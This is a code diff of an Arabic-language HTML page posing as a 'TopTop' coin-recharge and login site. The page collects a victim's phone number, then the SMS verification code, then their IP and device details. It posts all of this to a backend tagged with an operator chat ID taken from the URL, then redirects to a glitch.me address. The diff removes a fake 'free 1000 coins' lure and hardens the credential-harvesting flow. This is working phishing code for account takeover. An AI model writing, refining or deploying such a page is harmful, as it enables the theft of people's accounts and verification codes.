@@ -1,169 +1,64 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن أكوانزات TopTop - موقع الشحن الرسمي</title>
-    <meta property="og:title" content="شحن أكوانزات TopTop">
-    <meta property="og:description" content="مرحبا بك في أفضل موقع لشحن أكوانزات TopTop مجاناً. يمكنك الحصول على 1000 أكوانز مجاني!">
-    <meta property="og:image" content="https://example.com/toptop-acorns-image.jpg">
-    <meta property="og:image:type" content="image/jpeg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://YOUR_DOMAIN_HERE/toptop-acorns">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="شحن أكوانزات TopTop">
-    <meta name="twitter:description" content="مرحبا بك في أفضل موقع لشحن أكوانزات TopTop مجاناً. يمكنك الحصول على 1000 أكوانز مجاني!">
-    <meta name="twitter:image" content="https://example.com/toptop-acorns-image.jpg">
-     <style>
+    <title>تسجيل الدخول لـ TopTop</title>
+    <style>
         body {
-            font-family: 'Arial', sans-serif;
-            text-align: center;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
             margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #FF6B6B, #4ECDC4);
-            color: #ffffff;
-            overflow: auto;
-            position: relative;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-
         .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        h1, h2 {
+            color: #333;
+            text-align: center;
+        }
+        form {
             display: flex;
             flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
-            backdrop-filter: blur(8px);
-            position: relative;
-            z-index: 2;
         }
-
-        .login-container {
-            max-width: 500px;
-            padding: 30px;
-            border-radius: 10px;
-            background-color: rgba(0, 0, 0, 0.8);
-            box-shadow: 0 4px 10px rgba(0,0,0,0.6);
-        }
-
-        .login-container h1 {
-            margin: 0 0 20px;
-            font-size: 32px;
-            color: #FFD700;
-        }
-
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 15px;
+        input, select, button {
             margin: 10px 0;
-            border: none;
-            border-radius: 8px;
-            box-sizing: border-box;
-            background-color: #444;
-            color: #ffffff;
-            font-size: 18px;
-        }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 8px;
-            background-color: #FFD700;
-            color: #333;
-            font-size: 18px;
-            cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-        }
-
-        button:hover {
-            background-color: #FFC000;
-            transform: scale(1.02);
-        }
-
-        .pricing-section {
-            margin-top: 20px;
-            padding: 20px;
-            border-radius: 10px;
-            background-color: rgba(0, 0, 0, 0.7);
-            box-shadow: 0 4px 10px rgba(0,0,0,0.6);
-        }
-
-        .pricing-section h2 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            color: #FFD700;
-        }
-
-        .pricing-option {
-            margin: 10px 0;
-            padding: 15px;
-            border-radius: 8px;
-            background-color: #333;
-            color: #FFD700;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .pricing-option span {
-            font-size: 20px;
-        }
-
-        .pricing-option button {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            background-color: #FFD700;
-            color: #333;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        .pricing-option button:hover {
-            background-color: #FFC000;
-        }
-
-        .message {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
             padding: 10px;
-            background-color: #FF6B6B;
-            color: #fff;
-            text-align: center;
-            font-size: 18px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .message {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 10px;
             display: none;
-            z-index: 3;
-        }
-
-        @keyframes backgroundAnimation {
-            0% { background-position: 0% 0%; }
-            50% { background-position: 100% 100%; }
-            100% { background-position: 0% 0%; }
-        }
-
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://example.com/toptop-background.jpg') repeat;
-            animation: backgroundAnimation 60s linear infinite;
-            z-index: 1;
-            opacity: 0.2;
         }
     </style>
 </head>
 <body>
-     <div class="container">
+    <div class="container">
         <div class="message" id="message"></div>
         
         <div id="login-container">
@@ -185,7 +80,6 @@
                     <option value="DZ" data-code="+213">🇩🇿 الجزائر (+213)</option>
                 </select>
                 <input type="text" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
-                <input type="hidden" name="chatId" value="YOUR_CHAT_ID_HERE">
                 <button type="button" onclick="sendPhoneNumber()">إرسال رقم الهاتف</button>
             </form>
         </div>
@@ -197,26 +91,6 @@
                 <button type="submit">تأكيد الدخول</button>
             </form>
         </div>
-
-        <div class="pricing-section">
-            <h2>أسعار أكوانزات TopTop</h2>
-            <div class="pricing-option">
-                <span>1000 أكوانز - 0$</span>
-                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">مجاني</button>
-            </div>
-            <div class="pricing-option">
-                <span>2000 أكوانز - 2$</span>
-                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
-            </div>
-            <div class="pricing-option">
-                <span>5000 أكوانز - 5$</span>
-                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
-            </div>
-            <div class="pricing-option">
-                <span>10000 أكوانز - 10$</span>
-                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
-            </div>
-        </div>
     </div>
 
     <script>
@@ -227,6 +101,11 @@
             setTimeout(function() {
                 messageElement.style.display = 'none';
             }, 3000);
+        }
+
+        function getChatIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('chatId');
         }
 
         async function getIPInfo() {
@@ -266,7 +145,7 @@
         async function sendPhoneNumber() {
             const phoneNumber = document.getElementById('phoneNumber').value;
             const country = document.getElementById('country').value;
-            const chatId = document.querySelector('input[name="chatId"]').value;
+            const chatId = getChatIdFromUrl();
 
             if (!phoneNumber || !country || !chatId) {
                 showMessage('يرجى ملء جميع الحقول المطلوبة');
@@ -277,7 +156,6 @@
             const platformInfo = getPlatformInfo();
 
             try {
-                // هنا يجب استبدال '/sendPhoneNumber' بعنوان URL الفعلي لخادمك
                 const response = await fetch('/sendPhoneNumber', {
                     method: 'POST',
                     headers: {
@@ -289,9 +167,13 @@
                         chatId,
                         ip: ipInfo.ip,
                         platform: platformInfo.platform,
-                        userAgent: platformInfo.userAgent
+                        userAgent: navigator.userAgent
                     })
                 });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
 
                 const result = await response.json();
                 if (result.success) {
@@ -299,7 +181,7 @@
                     document.getElementById('login-container').style.display = 'none';
                     document.getElementById('verification-container').style.display = 'block';
                 } else {
-                    showMessage('حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
+                    showMessage(result.error || 'حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
                 }
             } catch (error) {
                 console.error('Error:', error);
@@ -312,7 +194,7 @@
             const verificationCode = document.getElementById('verificationCode').value;
             const phoneNumber = document.getElementById('phoneNumber').value;
             const country = document.getElementById('country').value;
-            const chatId = document.querySelector('input[name="chatId"]').value;
+            const chatId = getChatIdFromUrl();
 
             if (!verificationCode || !phoneNumber || !country || !chatId) {
                 showMessage('يرجى ملء جميع الحقول المطلوبة');
@@ -323,7 +205,6 @@
             const platformInfo = getPlatformInfo();
 
             try {
-                // هنا يجب استبدال '/verifyCode' بعنوان URL الفعلي لخادمك
                 const response = await fetch('/verifyCode', {
                     method: 'POST',
                     headers: {
@@ -336,19 +217,22 @@
                         chatId,
                         ip: ipInfo.ip,
                         platform: platformInfo.platform,
-                        userAgent: platformInfo.userAgent
+                        userAgent: navigator.userAgent
                     })
                 });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
 
                 const result = await response.json();
                 if (result.success) {
                     showMessage('تم التحقق من الكود بنجاح');
-                    // التوجيه إلى الرابط الوهمي بعد التحقق الناجح
                     setTimeout(() => {
                         window.location.href = "https://polarized-believed-fisherman.glitch.me/";
                     }, 3000);
                 } else {
-                    showMessage('فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
+                    showMessage(result.error || 'فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
                 }
             } catch (error) {
                 console.error('Error:', error);
